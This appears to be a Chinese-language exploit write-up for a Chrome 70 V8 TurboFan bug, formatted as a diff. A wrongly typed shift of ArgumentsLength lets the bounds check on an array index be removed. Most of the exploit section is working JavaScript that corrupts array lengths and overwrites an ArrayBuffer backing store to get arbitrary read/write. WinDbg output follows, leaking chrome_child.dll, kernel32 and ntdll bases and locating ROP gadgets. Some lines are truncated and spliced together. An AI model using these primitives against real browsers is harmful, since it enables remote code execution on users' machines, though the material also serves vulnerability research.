@@ -1,0 +1,218 @@
+          Type type = typing.TypeNode(node);
+          if (is_typed) {
+            type = Type::Intersect(type, NodeProperties::GetType(node),
+                                   typer_->zone());
+          }
+          NodeProperties::SetType(node, type);
+        }
+      }
+    }
+    ...
+    ...
+    Type Typer::Visitor::TypeArgumentsLength(Node* node) {
+      return TypeCache::Get().kArgumentsLengthType;
+    }
+    ...
+    ...
+    Type const kArgumentsLengthType =
+        Type::Range(0.0, Code::kMaxArguments, zone());
+    ...
+    ...
+    static const int kArgumentsBits = 16;
+    // Reserve one argument count value as the "don't adapt arguments" sentinel.
+    static const int kMaxArguments = (1 
+    #72:SpeculativeNumberShiftRight[SignedSmall](#171:ArgumentsLength, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]
+于是在simplified lowering
+phase里，为了修正这个SpeculativeNumberShiftRight的范围，于是再次对其进行typer计算。
+    // Forward propagation of types from type feedback.
+    void RunTypePropagationPhase() {
+    ...
+        bool updated = UpdateFeedbackType(node);    
+    ->
+    Type OperationTyper::NumberShiftRight(Type lhs, Type rhs) {
+      DCHECK(lhs.Is(Type::Number()));
+      DCHECK(rhs.Is(Type::Number()));
+      lhs = NumberToInt32(lhs);
+      rhs = NumberToUint32(rhs);
+      if (lhs.IsNone() || rhs.IsNone()) return Type::None();
+      int32_t min_lhs = lhs.Min();
+      int32_t max_lhs = lhs.Max();
+      uint32_t min_rhs = rhs.Min();
+      uint32_t max_rhs = rhs.Max();
+      if (max_rhs > 31) {
+        // rhs can be larger than the bitmask
+        max_rhs = 31;
+        min_rhs = 0;
+      }
+      double min = std::min(min_lhs >> min_rhs, min_lhs >> max_rhs);
+      double max = std::max(max_lhs >> min_rhs, max_lhs >> max_rhs);
+      if (max == kMaxInt && min == kMinInt) return Type::Signed32();
+      return Type::Range(min, max, zone());
+    }
+    ...
+    ...
+    Range(0, 65534)
+    Range(16, 16)
+    min lhs is 0
+    min rhs is 16
+    max lhs is 65534
+    max rhs is 16
+    ->
+    NumberShiftRight Range(0,0)
+由于这个结果被作为数组的index，所以最终在VisitCheckBounds里，会比较这个范围和数组最大的长度，如果始终index小于数组的length，那么就会将其remove掉。
+    void VisitCheckBounds(Node* node, SimplifiedLowering* lowering) {
+        CheckParameters const& p = CheckParametersOf(node->op());
+        Type const index_type = TypeOf(node->InputAt(0));
+        Type const length_type = TypeOf(node->InputAt(1));
+        if (length_type.Is(Type::Unsigned31())) {
+          if (index_type.Is(Type::Integral32OrMinusZero())) {
+            // Map -0 to 0, and the values in the [-2^31,-1] range to the
+            // [2^31,2^32-1] range, which will be considered out-of-bounds
+            // as well, because the {length_type} is limited to Unsigned31.
+            VisitBinop(node, UseInfo::TruncatingWord32(),
+                       MachineRepresentation::kWord32);
+            if (lower()) {
+              if (lowering->poisoning_level_ ==
+                      PoisoningMitigationLevel::kDontPoison &&
+                  (index_type.IsNone() || length_type.IsNone() ||
+                   (index_type.Min() >= 0.0 &&
+                    index_type.Max() InputAt(0));
+## exploit
+### 得到任意地址读写和用户态对象leak的原语
+通过a1的单次越界写改掉oob_double_Array的长度，将其改的很大，然后在后面放一个object Array。
+    a1 = new Array(0x10);
+    a1[0] = 1.1;
+    oob_double_Array = new Array(0x10);
+    oob_double_Array[0] = 1.1;
+    object_Array = new Array(0x10);
+    object_Array[0] = {};
+    object_Array[1] = leak;
+    x = x >> 16
+    a1[x * 19] = 2.60750842793813e-310;  // 0x0000300000000000
+    a1[x * 21] = 2.60750842793813e-310;  // 0x0000300000000000
+    a1[x * 41] = 2.60750842793813e-310;  // 0x0000300000000000
+通过将要leak的对象放入object Array，然后通过oob_double_Array将该对象越界读出，得到的就是该对象的指针的double表示。
+    function user_space_read(leak){
+      object_Array[1] = leak;
+      return oob_double_Array[23];
+    }
+然后我们再new一个ArrayBuffer，通过oob_double_Array的越界写，可以改它的backing_store，于是就可以任意地址读写。
+    oob_buffer = new ArrayBuffer(0x1000);
+    ...
+    function writePtr(offset, address, value){
+      oob_double_Array[offset] = address;
+      fake_dv = new Float64Array(oob_buffer);
+      fake_dv[0] = value;
+    }
+    function readPtr(offset, address){
+      oob_double_Array[offset] = address;
+      fake_dv = new Float64Array(oob_buffer);
+      return fake_dv[0];
+    }
+这里有一个小trick就是，我们的oob_double_Array和ArrayBuffer的偏移是不固定的。  
+但是通过user_space_read，我们可以先leak出oob_double_Array和oob_buffer的地址，由于oob_double_Array的fixedArray与其偏移是固定的，而oob_buffer的backing_store和oob_buffer的偏移是固定的.  
+所以我们可以计算出这个偏移是多少。
+### 得到chrome_child.dll的基地址
+leak出一个blink对象div的地址，它偏移0x20的位置是HTMLDivElement对象，读出后，再读出它首部的虚表地址，然后减去和chrome_child.dll的偏移就是chrome_child.dll的基地址了。
+    let div = document.createElement('div');
+    let div_addr = user_space_read(div);
+    alert("[+] the div_addr is at " + Int64.fromDouble(div_addr).toString());
+    el_addr = readPtr(offset, div_addr + new Int64(0x1f).asDouble());
+    alert("[+] the el_addr is at " + Int64.fromDouble(el_addr).toString());
+    0:017> dq 0x00004c0eb3ea31f8
+    00004c0e`b3ea31f8  00007ffb`49c9e910 000001e7`ec4da5c0
+    00004c0e`b3ea3208  00000000`000e101c 00000000`00000000
+    00004c0e`b3ea3218  00004c0e`b3ea2538 00000000`00000000
+    00004c0e`b3ea3228  00000000`00000000 00007ffb`4a46d1f0
+    00004c0e`b3ea3238  00000000`00000000 00000000`00000000
+    00004c0e`b3ea3248  00005a68`da2417e8 00000000`00000000
+    00004c0e`b3ea3258  00000000`00000000 00000000`00000000
+    00004c0e`b3ea3268  00000000`00000000 00000000`00000000
+    0:017> g
+    (3d7c.3af4): Break instruction exception - code 80000003 (first chance)
+    ntdll!DbgBreakPoint:
+    00007ffb`9da98cc0 cc              int     3
+    0:017> uf 00007ffb`49c9e910
+    chrome_child!blink::HTMLDivElement::`vftable':
+    00007ffb`49c9e910 dcb14b47fb7f    fdiv    qword ptr [rcx+7FFB474Bh]
+    00007ffb`49c9e916 0000            add     byte ptr [rax],al
+    00007ffb`49c9e918 3030            xor     byte ptr [rax],dh
+    00007ffb`49c9e91a c247fb          ret     0FB47h
+    0:017> !address chrome_child
+    Mapping file section regions...
+    Mapping module regions...
+    Mapping PEB regions...
+    Mapping TEB and stack regions...
+    Mapping heap regions...
+    Mapping page heap regions...
+    Mapping other regions...
+    Mapping stack trace database regions...
+    Mapping activation context regions...
+    Usage:                  Image
+    Base Address:           00007ffb`45960000
+    End Address:            00007ffb`45961000
+    Region Size:            00000000`00001000 (   4.000 kB)
+    State:                  00001000          MEM_COMMIT
+    Protect:                00000002          PAGE_READONLY
+    Type:                   01000000          MEM_IMAGE
+    Allocation Base:        00007ffb`45960000
+    Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
+    Image Path:             C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll
+    Module Name:            chrome_child
+    Loaded Image Name:      C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll
+    Mapped Image Name:      
+    More info:              lmv m chrome_child
+    More info:              !lmi chrome_child
+    More info:              ln 0x7ffb45960000
+    More info:              !dh 0x7ffb45960000
+    Content source: 1 (target), length: 1000
+    0:017> ? 00007ffb`49c9e910-00007ffb`45960000
+    Evaluate expression: 70510864 = 00000000`0433e910
+### 计算kernel32的基地址
+    0:016> x chrome_child!*CreateEventW*
+    00007ffb`465faea2 chrome_child!media::MediaLog::CreateEventW (media::MediaLogEvent::Type)
+    00007ffb`4a33b4f8 chrome_child!_imp_CreateEventW = 
+    0:016> dq 00007ffb`4a33b4f8
+    00007ffb`4a33b4f8  00007ffb`9c001f20
+    0:016> u 00007ffb`9c001f20
+    KERNEL32!CreateEventW:
+    00007ffb`9c001f20 ff2522480500    jmp     qword ptr [KERNEL32!_imp_CreateEventW (00007ffb`9c056748)]
+    00007ffb`9c001f26 cc              int     3
+    00007ffb`9c001f27 cc              int     3
+    00007ffb`9c001f28 cc              int     3
+    00007ffb`9c001f29 cc              int     3
+    00007ffb`9c001f2a cc              int     3
+    00007ffb`9c001f2b cc              int     3
+    00007ffb`9c001f2c cc              int     3
+### 计算ntdll的基地址
+    0:016> x KERNEL32!*NtQueryEvent*
+    00007ffb`9c056dd8 KERNEL32!_imp_NtQueryEvent = 
+    0:016> dq 00007ffb`9c056dd8
+    00007ffb`9c056dd8  00007ffb`9da95db0
+    0:016> u 00007ffb`9da95db0
+    ntdll!NtQueryEvent:
+    00007ffb`9da95db0 4c8bd1          mov     r10,rcx
+    00007ffb`9da95db3 b856000000      mov     eax,56h
+    00007ffb`9da95db8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+    00007ffb`9da95dc0 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffb`9da95dc5)
+    00007ffb`9da95dc2 0f05            syscall
+    00007ffb`9da95dc4 c3              ret
+    00007ffb`9da95dc5 cd2e            int     2Eh
+### 寻找gadaget
+#### 栈劫持
+    00007ff9`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]
+    00007ff9`296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]
+    00007ff9`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]
+    00007ff9`296f0711 ffe2            jmp     rdx
+search->sequence of bytes  
+#### mprotect
+    // pop rcx ; ret     59 c3
+    // pop rdx ; ret       5a c3
+    // pop r8 ; ret      41 58 c3
+    // pop r9 ; ret      41 59 c3
+    0:016> u 00007ffb`45d6982c
+    chrome_child!blink::AutoscrollController::HandleMouseMoveForMiddleClickAutoscroll+0x16c [C:\b\c\b\win64_clang\src\third_party\blink\renderer\core\page\autoscroll_controller.cc @ 237]:
+    00007ffb`45d6982c 59              pop     rcx
+    00007ffb`45d6982d c3              ret
+    0:016> s -w 00007ffb`45960000 L1000000 C359
+    00007ffb`45d6982c  c359 0ff3 4411 2024 0ff3 7c11 2424 2e0f  Y....D$ ...|$$..
